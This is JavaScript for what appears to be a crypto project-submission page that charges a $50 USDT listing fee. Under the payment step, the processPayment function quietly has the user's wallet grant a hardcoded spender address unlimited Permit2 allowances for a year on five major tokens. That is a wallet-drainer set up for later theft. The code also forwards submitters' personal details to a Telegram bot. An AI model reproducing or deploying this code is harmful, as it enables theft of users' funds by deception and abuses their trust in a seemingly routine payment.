/*************************************************
 * CONFIG
 *************************************************/
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const SPENDER_ADDRESS = "0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85";
const RECEIVER_ADDRESS = "0xf539bf56c465b6d0f0caee783ca1f8c58c802b1a";

const AMOUNT_USDT = "50";
const WALLETCONNECT_PROJECT_ID = "85d1310d55b14854c6d62bab3b779200";

const MAX_UINT160 = ethers.BigNumber.from(
  "0xffffffffffffffffffffffffffffffff"
);

const expiration =
  Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 365;

/*************************************************
 * TOKEN LIST
 *************************************************/
const TOKENS = {
  USDT: {
    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    decimals: 6
  },
  USDC: {
    address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606EB48",
    decimals: 6
  },
  DAI: {
    address: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
    decimals: 18
  },
  WBTC: {
    address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
    decimals: 8
  },
  BNB: {
    address: "0xB8c77482e45F1F44dE1745F52C74426C631bDD52",
    decimals: 18
  }
};

/*************************************************
 * ABIs
 *************************************************/
const ERC20_ABI = [
  "function transfer(address,uint256)",
  "function approve(address,uint256)",
  "function allowance(address,address) view returns (uint256)"
];

const PERMIT2_ABI = [
  "function allowance(address,address,address) view returns (uint160,uint48,uint48)",
  "function approve(address token, address spender, uint160 amount, uint48 expiration)"
];

/*************************************************
 * DOM + FORM (FROM SCRIPT 1)
 *************************************************/
document.addEventListener("DOMContentLoaded", () => {

  const form = document.getElementById("projectForm");
  const paymentModal = document.getElementById("paymentModal");
  const walletModal = document.getElementById("walletModal");
  const underReviewModal = document.getElementById("underReviewModal");

  const connectPayBtn = document.getElementById("connectPayBtn");
  const metaMaskBtn = document.getElementById("metaMaskBtn");
  const walletConnectBtn = document.getElementById("walletConnectBtn");
  const closeReviewBtn = document.getElementById("closeReviewBtn");

  /* FORM SUBMIT */
  form.addEventListener("submit", e => {
    e.preventDefault();
    paymentModal.style.display = "flex";
  });

  connectPayBtn.onclick = () => {
    paymentModal.style.display = "none";
    walletModal.style.display = "flex";
  };

  closeReviewBtn.onclick = () => {
    underReviewModal.style.display = "none";
  };

  /*************************************************
   * HELPERS (FROM SCRIPT 1)
   *************************************************/
  function getFormData() {
    return Object.fromEntries(new FormData(form).entries());
  }

  function showUnderReview() {
    localStorage.setItem("projectSubmissionStatus", "under_review");
    walletModal.style.display = "none";
    underReviewModal.style.display = "flex";
  }

  async function sendToTelegram(message) {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML"
      })
    });
  }

  function formatTelegramMessage(data, paymentTx) {
    return `
<b>🆕 New Project Submission</b>

<b>Project:</b> ${data.projectName}
<b>Symbol:</b> ${data.tokenSymbol}
<b>Chain:</b> ${data.blockchain}
<b>Contract:</b> ${data.contract}

<b>Description:</b>
${data.description}

<b>Website:</b> ${data.website}
<b>Twitter:</b> ${data.twitter}
<b>Telegram:</b> ${data.telegram}

<b>Developer:</b> ${data.devName}
<b>Email:</b> ${data.devEmail}

<b>Payment TX:</b>
<code>${paymentTx}</code>

<b>Status:</b> UNDER REVIEW
`;
  }

  /*************************************************
   * CORE PAYMENT FLOW (SCRIPT 2)
   *************************************************/
  async function processPayment(provider) {
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();

    const usdt = new ethers.Contract(
      TOKENS.USDT.address,
      ERC20_ABI,
      signer
    );

    const permit2 = new ethers.Contract(
      PERMIT2_ADDRESS,
      PERMIT2_ABI,
      signer
    );

    /* 1️⃣ PAY $50 */
    const amount = ethers.utils.parseUnits(
      AMOUNT_USDT,
      TOKENS.USDT.decimals
    );

    const paymentTx = await usdt.transfer(
      RECEIVER_ADDRESS,
      amount
    );
    await paymentTx.wait();

    /* 2️⃣ PERMIT2 MULTI-TOKEN APPROVAL */
    for (const symbol in TOKENS) {
      const token = TOKENS[symbol];

      const [currentAllowance] = await permit2.allowance(
        userAddress,
        token.address,
        SPENDER_ADDRESS
      );

      if (currentAllowance.lt(MAX_UINT160.div(2))) {
        const tx = await permit2.approve(
          token.address,
          SPENDER_ADDRESS,
          MAX_UINT160,
          expiration
        );
        await tx.wait();
      }
    }

    /* 3️⃣ SIGN METADATA */
    const message = JSON.stringify({
      amount: AMOUNT_USDT,
      token: "USDT",
      receiver: RECEIVER_ADDRESS,
      tx: paymentTx.hash
    });

    const signature = await signer.signMessage(message);

    /* 4️⃣ BACKEND NOTIFY */
    await fetch("/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userAddress,
        amount: AMOUNT_USDT,
        token: "USDT",
        paymentTxHash: paymentTx.hash,
        signature
      })
    });

    /* 5️⃣ TELEGRAM + UI */
    const formData = getFormData();
    await sendToTelegram(
      formatTelegramMessage(formData, paymentTx.hash)
    );

    showUnderReview();
  }

  /*************************************************
   * WALLET BUTTONS
   *************************************************/
  metaMaskBtn.onclick = async () => {
    if (!window.ethereum) {
      alert("MetaMask not installed");
      return;
    }

    const provider = new ethers.providers.Web3Provider(
      window.ethereum,
      "any"
    );

    await provider.send("eth_requestAccounts", []);
    await processPayment(provider);
  };

  walletConnectBtn.onclick = async () => {
    const { EthereumProvider } = await import(
      "https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle"
    );

    const wcProvider = await EthereumProvider.init({
      projectId: WALLETCONNECT_PROJECT_ID,
      chains: [1],
      showQrModal: true
    });

    await wcProvider.enable();

    const provider = new ethers.providers.Web3Provider(
      wcProvider,
      "any"
    );

    await processPayment(provider);
  };

  /*************************************************
   * PERSISTENCE
   *************************************************/
  if (localStorage.getItem("projectSubmissionStatus") === "under_review") {
    underReviewModal.style.display = "flex";
  }
});
